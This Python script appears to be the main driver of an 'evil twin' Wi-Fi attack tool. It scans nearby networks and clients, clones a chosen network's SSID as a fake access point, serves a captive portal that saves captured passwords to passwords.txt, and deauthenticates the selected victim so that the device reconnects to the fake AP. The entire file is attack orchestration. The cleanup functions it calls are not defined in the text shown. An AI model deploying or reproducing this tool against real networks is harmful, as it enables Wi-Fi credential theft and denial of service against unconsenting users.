#!/usr/bin/env python3

import subprocess
import sys
import time
import threading
import signal
import evil_twin_framework.network as network
import evil_twin_framework.data as data
import evil_twin_framework.dauth as dauth
import evil_twin_framework.fake_ap as fake_ap
import evil_twin_framework.captive_portal as cp

ONE_MINUTE_SCAN = 60


def main():
    # Select interface for monitoring/scanning/deauth
    iface = network.select_interface()

    # Set up monitor mode
    print(f"\n[*] Setting up monitor mode on {iface}...")
    command = ['sudo', 'bash', './set_up_monitor.sh', iface]

    try:
        subprocess.run(command, check=True, capture_output=True, text=True)
        print(f"[✓] Monitor mode enabled on {iface}")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to set up monitor mode: {e}")
        sys.exit(1)

    # Start sniffing in background thread
    print("[*] Starting network monitoring...")
    sniff_thread = threading.Thread(target=network.start_sniff, args=(iface,), daemon=True)
    sniff_thread.start()

    # Initial sniffing warm-up
    warmup = 30  # Reduced from 60 for faster testing
    print(f"[*] Gathering initial data for {warmup} seconds...")

    # Show progress
    for i in range(warmup):
        print(f"\r[*] Scanning: {i+1}/{warmup} seconds", end='', flush=True)
        time.sleep(1)
    print("\n")

    try:
        while True:
            networks = network.get_networks()
            clients = network.get_clients()

            if not networks:
                print("\n[!] No networks found yet. Continuing scan...")
                time.sleep(5)
                continue

            data.display_networks(networks, clients)
            choice = input("\nEnter network index to inspect, 'r' to refresh, 'q' to quit: ").strip().lower()

            if choice == 'q':
                cleanup_and_exit()

            if choice == 'r':
                refresh = 30
                print(f"\n[*] Refreshing for {refresh} seconds...")
                for i in range(refresh):
                    print(f"\r[*] Scanning: {i+1}/{refresh} seconds", end='', flush=True)
                    time.sleep(1)
                print("\n")
                continue

            if choice.isdigit() and int(choice) < len(networks):
                idx = int(choice)
                target_bssid, info = network.get_network_by_index(idx)

                if target_bssid:
                    data.display_selected_ap(info, target_bssid)

                    # Client menu
                    while True:
                        client_list = clients.get(target_bssid, {})

                        if not client_list:
                            print("\n[!] No clients detected for this network yet.")
                            wait = input("Press 'b' to go back, 'w' to wait and refresh: ").strip().lower()
                            if wait == 'b':
                                break
                            elif wait == 'w':
                                print("[*] Waiting 10 seconds...")
                                time.sleep(10)
                                continue
                            continue

                        data.display_clients(target_bssid, clients)
                        sub = input("\nSelect client index, 'b' to go back, 'q' to quit: ").strip().lower()

                        if sub == 'b':
                            break

                        if sub.isdigit() and int(sub) < len(client_list):
                            client_mac, cinfo = network.get_client_by_index(target_bssid, int(sub))

                            if client_mac:
                                data.display_final_selection(info, target_bssid, client_mac, cinfo)

                                # Ask for attack type
                                print("\n[ATTACK OPTIONS]")
                                print("  'e' - Evil Twin attack (fake AP + captive portal + deauth)")
                                print("  'n' - No attack (return to menu)")

                                attack_choice = input("\nYour choice: ").strip().lower()

                                if attack_choice == 'e':
                                    # Evil Twin attack
                                    print("\n[*] Preparing Evil Twin attack...")

                                    # AP always runs on wlan0, deauth uses selected interface
                                    ap_interface = "wlan0"
                                    deauth_interface = iface  # The interface user selected for monitoring

                                    print(f"[*] AP will run on: {ap_interface} (built-in)")
                                    print(f"[*] Deauth will use: {deauth_interface}")

                                    # Warn if using same interface
                                    if deauth_interface == ap_interface:
                                        print("\n[WARNING] Using same interface for deauth and AP!")
                                        print("[!] Deauth won't work while AP is active")
                                        print("[!] For best results, use a USB adapter for monitoring/deauth")

                                    ssid = info['SSID']
                                    channel = info['Channel'] or 6
                                    ap_ip = "192.168.0.1"
                                    dhcp_start = "192.168.0.100"
                                    dhcp_end = "192.168.0.200"

                                    # Start Fake AP and Captive Portal in separate threads
                                    print("\n[*] Starting Fake AP and Captive Portal threads...")
                                    ap_thread = threading.Thread(
                                        target=fake_ap.create_fake_ap,
                                        args=(ssid, channel, ap_interface, ap_ip, dhcp_start, dhcp_end),
                                        daemon=True
                                    )
                                    portal_thread = threading.Thread(
                                        target=cp.captive_portal,
                                        args=(ap_ip, 80),
                                        daemon=True
                                    )
                                    ap_thread.start()
                                    # Small delay to let AP configure before portal binds to IP
                                    time.sleep(3)
                                    portal_thread.start()

                                    # Give services time to initialize
                                    time.sleep(5)

                                    # Perform deauth after AP and portal started
                                    if deauth_interface == ap_interface:
                                        print("\n[WARNING] Cannot deauth from wlan0 while AP is active on it")
                                        print("[!] Clients must disconnect naturally or be deauth'd manually")
                                        print("[!] Evil Twin is running and waiting for connections...")
                                    else:
                                        duration = 60
                                        print(f"\n[*] Deauthing client {client_mac} for {duration} seconds...")
                                        print(f"[*] Using {deauth_interface} for deauth attacks")
                                        print("[*] Client should reconnect to our fake AP on wlan0")

                                        dauth.start_attack(client_mac, target_bssid, deauth_interface, duration)

                                        # Wait for attack with progress
                                        for i in range(duration):
                                            if not dauth.is_attack_running():
                                                break
                                            print(f"\r[*] Deauth progress: {i+1}/{duration} seconds", end='', flush=True)
                                            time.sleep(1)
                                        print("\n")

                                        print("[✓] Deauth completed!")

                                    print("\n[*] Evil Twin is active!")
                                    print("[*] Captive portal waiting for credentials at 192.168.0.1")
                                    print("[*] Captured credentials will be saved to: passwords.txt")
                                    print("\n[TIP] Connect a phone to test the captive portal")

                                    # Keep running until user stops
                                    input("\nPress Enter to stop Evil Twin and return to scanning...")

                                    # Stop Evil Twin (cleanup AP, try to free portal)
                                    print("[*] Stopping Evil Twin...")
                                    try:
                                        fake_ap.cleanup()
                                    except Exception as e:
                                        print(f"[!] Error during AP cleanup: {e}")

                                    # Give system time to restore
                                    print("[*] Waiting for system to stabilize...")
                                    time.sleep(3)

                                # After attack or if user chose 'n'
                                if attack_choice != 'q':
                                    next_action = input("\nWhat next? 'c' to continue scanning, 'q' to quit: ").strip().lower()
                                    if next_action == 'q':
                                        cleanup_and_exit()
                                # If 'c' or anything else, continue scanning
            else:
                print("Invalid choice. Please try again.")

    except KeyboardInterrupt:
        signal_handler(None, None)
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        cleanup_and_exit()


if __name__ == '__main__':
    main()
